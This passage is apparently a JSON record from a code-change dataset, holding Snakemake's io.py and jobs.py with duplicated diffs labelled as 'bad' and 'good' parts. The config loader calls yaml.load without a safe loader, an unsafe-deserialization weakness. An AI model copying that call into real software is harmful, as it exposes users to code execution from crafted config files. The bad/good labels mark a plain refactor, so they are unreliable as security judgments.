\"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"},"\/snakemake\/jobs.py":{"changes":[{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]},{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            